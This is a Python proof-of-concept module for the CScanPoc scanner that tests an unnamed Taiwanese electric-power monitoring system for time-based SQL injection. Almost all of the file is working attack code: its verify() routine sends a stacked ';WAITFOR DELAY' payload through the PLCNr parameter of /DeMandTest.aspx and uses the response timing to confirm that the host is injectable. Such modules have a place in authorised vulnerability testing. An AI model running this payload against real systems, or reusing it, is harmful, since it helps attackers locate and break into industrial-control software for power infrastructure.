# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.parse
import time


class Vuln(ABVuln):
    vuln_id = 'Electric_Monitor_0001'  # 平台漏洞编号，留空
    name = '台湾某电力监控系统通用型注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-03-23'  # 漏洞公布时间
    desc = '''
        台湾某电力监控系统通用型注入漏洞。
        /DeMandTest.aspx?B=0&Month=1&PLCNr=5*&MeterID=1
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '电力监控系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '45350116-1e89-4495-9121-ce3940f8eeaf'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-26'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # https://wooyun.shuimugan.com/bug/view?bug_no=102603
            hh = hackhttp.hackhttp()
            arg = self.target
            start_time1 = time.time()
            code1, head, res, errcode, _ = hh.http(arg)
            true_time = time.time() - start_time1
            start_time2 = time.time()
            url = arg + "/DeMandTest.aspx?B=0&Month=1&PLCNr=5;WAITFOR%20DELAY%20'0:0:6'--&MeterID=1"
            code2, head, res, errcode, _ = hh.http(url)
            flase_time = time.time() - start_time2

            if code1 == 200 and code2 == 500 and flase_time > true_time and flase_time > 5 and true_time < 2:
                # security_hole(url)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
